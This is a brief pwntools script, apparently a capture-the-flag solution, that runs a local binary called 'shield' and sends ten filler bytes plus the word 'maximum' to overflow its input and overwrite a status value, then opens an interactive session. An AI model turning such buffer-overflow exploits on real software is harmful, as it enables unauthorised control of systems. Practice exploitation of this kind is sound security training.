#!/usr/bin/env python3

from pwn import *

exe = ELF("./shield")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process("./shield")

payload = b"A"*10 + b"maximum"

p.recvuntil(b"New shield status:")
p.sendline(payload)

p.interactive()